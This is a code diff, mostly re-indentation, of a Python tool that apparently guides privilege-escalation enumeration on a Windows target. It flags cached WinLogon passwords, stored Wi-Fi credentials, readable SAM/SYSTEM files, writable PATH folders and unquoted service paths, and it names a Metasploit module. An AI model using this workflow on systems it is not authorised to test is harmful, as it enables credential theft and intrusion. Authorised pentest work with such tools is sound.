+                print(formatting.red_b('[!!!] Found WinLogon cache Default Password: %s' % defpass))
+                print_ways_to_connect_with_new_credentials()
+
+            # if (len(defuname)!=0 and len(defpass) != 0):
+            enter_to_continue()
+
+            print()
+        if (type == 'registrypass'):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to password wildcards in Windows Registry'))
+            userinfo_data.add_paths(absolute_path,type)
+            userinfo_data.print_paths(type)
+            print(formatting.yellow(
+                '[+] A list of potential Registry passwords mentions has been stored...'))
+            print()
+            print(formatting.yellow(
+                '[*] Take a look at file %s before continuing with next step...' %absolute_path))
+            enter_to_continue()
+        if (type == "passfiles"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to passwords in configuration files, etc...'))
+            userinfo_data.add_paths(absolute_path,type)
+            userinfo_data.print_paths(type)
+            print(formatting.yellow(
+                '[+] A list of potential paths to passwords mentions has been stored...'))
+            print()
+            print(formatting.yellow(
+                '[*] Take a look at file %s before continuing with next step...' %absolute_path))
+            enter_to_continue()
+
+        if (type == "wifipasswords"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to WIFI passwords located in the system...'))
+            sysinfo_data.add_wificredentials(absolute_path, wsparser.get_section('locale_%s' % cmdlang))
+            print(formatting.yellow(
+                '[+] A list of WIFI password has been stored...'))
+            print()
+
+            if len(sysinfo_data.wificredentials) > 0:
+                print(formatting.red_b("[!] Following credentials were retrieved from target system:"))
+                sysinfo_data.print_wificredentials()
+                print(formatting.red_b('   ONE OF THEM COULD BE USED FOR LATERAL MOVEMENTS OR THE PASSWORDS'))
+                print(formatting.red_b('   COULD BE REUSED FOR ESCALATION INTO THIS TARGET OR OTHER TARGETS IN NETWORK.\n'))
+            else:
+                print(formatting.yellow('[*] No credentials found (not exploitable)...\n'))
+
+            print()
+            enter_to_continue()
+
+        if (type == "secfilespermissions"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to user\'s access to security files (SAM, SYSTEM, SECURITY)...'))
+            userinfo_data.add_paths(absolute_path,type)
+            userinfo_data.print_paths(type)
+            print(formatting.yellow(
+                '[+] All the security folders and their permissions for the compromised user have been stored...'))
+            print()
+
+            if len(userinfo_data.securitypaths) > 0:
+                print(formatting.green(
+                    '[*] Following paths have FULL/WRITE PERMISSIONS:'))
+                userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
+                print()
+
+                if not bool(userinfo_data.is_admin) :
+                    if yesno(formatting.red_b(f'[!] Do you want to check also the READABLE security files by user?')):
                         print(formatting.green(
                             '[*] Following paths have READ PERMISSIONS:'))
+
                         userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
                         print()
-        else:
-            print(formatting.yellow('[*] No paths found...\n'))
-        
-        enter_to_continue()
-        
-    if (type == "targetusers"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the Active users info at the target system...'))
-        sysinfo_data.add_users(absolute_path)
-        sysinfo_data.print_users()
 
-        print(formatting.yellow(
-            '[+] All the Active users info in the target system have been stored...'))
-        print()
-        enter_to_continue()
-    if (type == "services"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to services at the target system...'))
-        sysinfo_data.add_services(absolute_path)
+            enter_to_continue()
+            print()
+        if (type == "extfilespermissions"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to user\'s permissions on ext files on PATH folders...'))
+            userinfo_data.add_paths(absolute_path,type)
+            #userinfo_data.print_paths(type)
+            print(formatting.yellow(
+                '[+] All the ext files in PATH folders and their permissions have been stored...'))
+            print()
 
-        print(formatting.yellow(
-            '[+] All the Services info in the target system have been stored...'))
-        print()
+            if len(userinfo_data.pathextfiles) > 0:
+                if yesno(formatting.red_b(f'   [!] Do you want to check WRITABLE PATHS only for the non %WINROOT% binary paths?') +
+                            formatting.yellow('\n            [*] If you answer \'y|Y\', THE WRITABLE FOLDERS will be filtered') +
+                            formatting.yellow(f' to the non %WINROOT% folders') +
+                            formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
 
-        print(formatting.yellow('\n[*] From the stored services, the following ones are services') +
-              formatting.green(' NO located in path \'windows\system32\':'))
+                            print(formatting.green(
+                                    '[*] Following paths have FULL/WRITE PERMISSIONS:'))
+                            userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
+                            print()
+                else:
+                            print(formatting.green(
+                                    '[*] Following paths have FULL/WRITE PERMISSIONS:'))
+                            userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
+                            print()
 
-        sysinfo_data.print_noWin32services()
+                if yesno(formatting.red_b(f'[!] Do you want to check now the READABLE binary paths?')):
 
-        listServicesWithUSPWS = sysinfo_data.get_servicesWithSpacesInUnquotedPaths()
+                    if yesno(formatting.red_b(f'   [!] Do you want to check only the non %WINROOT% binary paths?') +
+                            formatting.yellow('\n            [*] If you answer \'y|Y\', THE READABLE FOLDERS will be filtered') +
+                            formatting.yellow(f' to the non %WINROOT% folders') +
+                            formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):
 
-        if len(listServicesWithUSPWS) > 0:
-            print(formatting.red_b('[!] The Following services have unquotted paths with spaces: '))
-            sysinfo_data.print_servicesWithSpacesInUnquotedPaths()
-            print(formatting.red_b('   An attacker with write/exec access to any of the subpaths between spaces could'))
-            print(formatting.red_b('   craft a malicious program in one of them, to execute with this'))
-            print(formatting.red_b('   service\'s privileges.'))
-            print(formatting.red_b ('   You could also use Metasploit Module: ') + formatting.cyan_b('exploit/windows/local/unquoted/service_path'))
-        else:
-             print(formatting.yellow('[*] NO Services with spaces in their non quottation paths were found (not exploitable)...\n'))           
-        
-        print()
-        enter_to_continue()
-    if (type == "servicespermissions"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the permissions related to the service executables at the target system...'))
-        sysinfo_data.add_svcpermissions(absolute_path)
-        sysinfo_data.print_svcpermissions()
+                            print(formatting.green(
+                                '[*] Following paths have READ PERMISSIONS:'))
+                            userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
+                            print()
+                    else:
+                            print(formatting.green(
+                                '[*] Following paths have READ PERMISSIONS:'))
+                            userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
+                            print()
+            else:
+                print(formatting.yellow('[*] No paths found...\n'))
 
-        print(formatting.yellow(
-            '[+] All the services executables permissions in the target system have been stored. Check them, please...'))
-        print()
-        enter_to_continue()
-    if (type == "nonuserprocesses"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to non user \'%s\'\'s  processes at the target system...' % str(userinfo_data.name)))
-        sysinfo_data.add_processes(absolute_path)
-        sysinfo_data.print_processes()
+            enter_to_continue()
 
-        print(formatting.yellow(
-            '[+] All non user \'%s\'\'s  processes in the target system have been stored...' % str(userinfo_data.name)))
-        print()
-        enter_to_continue()
-    if (type == "scheduledtasks"):
-        print()
-        print(formatting.yellow(
-            '[-] Storing the data info related to non Microsoft\'s Scheduled Tasks at the target system...'))
-        sysinfo_data.add_schtasks(absolute_path)
-        sysinfo_data.print_schtasks()
+        if (type == "targetusers"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the Active users info at the target system...'))
+            sysinfo_data.add_users(absolute_path)
+            sysinfo_data.print_users()
 
-        print(formatting.yellow(
-            '[+] All the non Microsoft\'s Scheduled Tasks in the target system have been stored. Check them, please..'))
-        print()
-        enter_to_continue()
+            print(formatting.yellow(
+                '[+] All the Active users info in the target system have been stored...'))
+            print()
+            enter_to_continue()
+        if (type == "services"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to services at the target system...'))
+            sysinfo_data.add_services(absolute_path)
+
+            print(formatting.yellow(
+                '[+] All the Services info in the target system have been stored...'))
+            print()
+
+            print(formatting.yellow('\n[*] From the stored services, the following ones are services') +
+                formatting.green(' NO located in path \'windows\system32\':'))
+
+            sysinfo_data.print_noWin32services()
+
+            listServicesWithUSPWS = sysinfo_data.get_servicesWithSpacesInUnquotedPaths()
+
+            if len(listServicesWithUSPWS) > 0:
+                print(formatting.red_b('[!] The Following services have unquotted paths with spaces: '))
+                sysinfo_data.print_servicesWithSpacesInUnquotedPaths()
+                print(formatting.red_b('   An attacker with write/exec access to any of the subpaths between spaces could'))
+                print(formatting.red_b('   craft a malicious program in one of them, to execute with this'))
+                print(formatting.red_b('   service\'s privileges.'))
+                print(formatting.red_b ('   You could also use Metasploit Module: ') + formatting.cyan_b('exploit/windows/local/unquoted/service_path'))
+            else:
+                print(formatting.yellow('[*] NO Services with spaces in their non quottation paths were found (not exploitable)...\n'))
+            print()
+            enter_to_continue()
+        if (type == "servicespermissions"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the permissions related to the service executables at the target system...'))
+            sysinfo_data.add_svcpermissions(absolute_path)
+            sysinfo_data.print_svcpermissions()
+
+            print(formatting.yellow(
+                '[+] All the services executables permissions in the target system have been stored. Check them, please...'))
+            print()
+            enter_to_continue()
+        if (type == "nonuserprocesses"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to non user \'%s\'\'s  processes at the target system...' % str(userinfo_data.name)))
+            sysinfo_data.add_processes(absolute_path)
+            sysinfo_data.print_processes()
+
+            print(formatting.yellow(
+                '[+] All non user \'%s\'\'s  processes in the target system have been stored...' % str(userinfo_data.name)))
+            print()
+            enter_to_continue()
+        if (type == "scheduledtasks"):
+            print()
+            print(formatting.yellow(
+                '[-] Storing the data info related to non Microsoft\'s Scheduled Tasks at the target system...'))
+            sysinfo_data.add_schtasks(absolute_path)
+            sysinfo_data.print_schtasks()
+
+            print(formatting.yellow(
+                '[+] All the non Microsoft\'s Scheduled Tasks in the target system have been stored. Check them, please..'))
+            print()
+            enter_to_continue()
 
     sleep(2)
 
@@ -1204,6 +1228,7 @@ def menu_cmd(step, commands, output_file, type, cmdlang=''):
 def main():
 
     global complete_version, sysinfo_data, userinfo_data, working_dir, same_as_target
+
     step = 0
 
     print(Banner(fulltitle, filename))
@@ -1251,7 +1276,7 @@ def main():
         # - Getting the SystemInfo output from user.
         step +=1
         if WINXP in complete_version or WIN2000 in complete_version:
-            main_command = 'wmic os get BootDevice,BuildNumber,BuildType,Caption,CodeSet,' 
+            main_command = 'wmic os get BootDevice,BuildNumber,BuildType,Caption,CodeSet,'
             main_command += 'CountryCode,CSDVersion,CurrentTimeZone,InstallDate,LastBootUpTime,'
             main_command += 'Manufacturer,OSLanguage,RegisteredUser,SerialNumber,'
             main_command += 'SystemDevice,SystemDirectory,SystemDrive,Version,WindowsDirectory'
@@ -1259,7 +1284,7 @@ def main():
             menu_cmd(step,[main_command],  'wmicsysinfo.txt', 'wmicsysinfo')
         else:
             menu_cmd(step,['systeminfo /nh /fo csv > <output_file>'],  'systeminfo.txt', 'sysinfo')
-        
+
         cmdlang = sysinfo_data.get_cmdlang()
 
         # - Complete info for the system: Check if system has not been patched in at last three months
@@ -1514,11 +1539,8 @@ def main():
         step +=1
         menu_cmd(step, [main_command], 'scheduledtasks.txt', 'scheduledtasks', cmdlang)
 
-
-
         # Exiting program..
         exit_program()
-
 
 if __name__ == '__main__':
     main()
